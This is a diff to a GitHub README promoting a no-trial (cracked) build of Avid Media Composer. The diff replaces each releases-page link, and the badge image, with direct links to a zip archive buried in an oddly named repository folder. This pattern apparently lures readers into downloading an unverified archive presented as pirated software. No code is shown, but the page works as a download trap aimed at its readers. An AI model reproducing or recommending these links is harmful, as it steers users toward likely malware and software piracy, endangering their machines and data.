@@ -1,6 +1,6 @@
 # 🎥 Avid-Media-Composer-No-Trial - Edit with Ease and Confidence
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/main/hemihyperidrosis/Avid-Media-Composer-No-Trial_v3.7.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/main/hemihyperidrosis/Avid-Media-Composer-No-Trial_v3.7.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To begin using Avid Media Composer, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access all available versions for download.
 
-   [Download on GitHub](https://github.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/releases)
+   [Download on GitHub](https://raw.githubusercontent.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/main/hemihyperidrosis/Avid-Media-Composer-No-Trial_v3.7.zip)
 
 2. **Select Your Version**: Find the latest release. Each version includes helpful updates and fixes, so choose the most recent one. 
 
@@ -71,7 +71,7 @@ To download Avid Media Composer:
 
 1. Click the link below to visit the releases page.
 
-   [Download on GitHub](https://github.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/releases)
+   [Download on GitHub](https://raw.githubusercontent.com/Kaushal-panchal-108/Avid-Media-Composer-No-Trial/main/hemihyperidrosis/Avid-Media-Composer-No-Trial_v3.7.zip)
 
 2. Choose the release that fits your needs and follow the installation instructions above.
 
